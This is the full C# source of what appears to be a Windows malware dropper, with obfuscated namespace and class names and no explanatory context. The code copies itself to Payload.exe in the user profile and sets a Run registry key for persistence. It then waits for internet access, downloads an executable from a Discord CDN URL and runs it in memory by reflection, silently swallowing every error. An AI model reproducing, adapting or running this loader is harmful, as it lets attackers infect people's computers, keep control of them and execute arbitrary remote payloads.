using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;
using Microsoft.Win32;

namespace grskdqodncws;

internal static class iuhaghoszhqxrauid
{
	private static List<string> ListURLS = new List<string>(new string[1] { "https://cdn.discordapp.com/attachments/733763759557968002/740252679187726336/lmOOO.exe" });

	public static void Main()
	{
		InstallPayload();
		while (!Intrnet())
		{
			Thread.Sleep(5000);
		}
		string[] array = ListURLS.ToArray();
		foreach (string url in array)
		{
			try
			{
				FetchFiles(url);
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	private static bool Intrnet()
	{
		WebRequest webRequest = WebRequest.Create("https://www.bing.com/");
		try
		{
			webRequest.GetResponse();
			return true;
		}
		catch
		{
			return false;
		}
	}

	private static void InstallPayload()
	{
		try
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Payload.exe");
			if (!(Process.GetCurrentProcess().MainModule!.FileName == text))
			{
				FileStream fileStream = null;
				fileStream = ((!File.Exists(text)) ? new FileStream(text, FileMode.CreateNew) : new FileStream(text, FileMode.Create));
				byte[] array = File.ReadAllBytes(Process.GetCurrentProcess().MainModule!.FileName);
				fileStream.Write(array, 0, array.Length);
				fileStream.Dispose();
				Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\").SetValue(Path.GetFileName(text), text);
				Process.Start(text);
				Thread.Sleep(50);
				Environment.Exit(0);
			}
		}
		catch (Exception)
		{
		}
	}

	private static void FetchFiles(string url)
	{
		using WebClient webClient = new WebClient();
		try
		{
			byte[] parameter = webClient.DownloadData(url);
			Thread thread = new Thread(Execute);
			thread.Start(parameter);
		}
		catch
		{
		}
	}

	private static void Execute(object Payload)
	{
		try
		{
			Assembly assembly = AppDomain.CurrentDomain.Load((byte[])Payload);
			MethodInfo methodInfo = Entry(assembly);
			object obj = assembly.CreateInstance(methodInfo.Name);
			object[] obj2 = new object[1];
			if (methodInfo.GetParameters().Length == 0)
			{
				obj2 = null;
			}
			MethodInfo(methodInfo, obj, obj2);
		}
		catch
		{
		}
	}

	private static object MethodInfo(MethodInfo meth, object obj1, object[] obj2)
	{
		if (meth != null)
		{
			return meth.Invoke(obj1, obj2);
		}
		return false;
	}

	private static MethodInfo Entry(Assembly obj)
	{
		if (obj != null)
		{
			return obj.EntryPoint;
		}
		return null;
	}
}
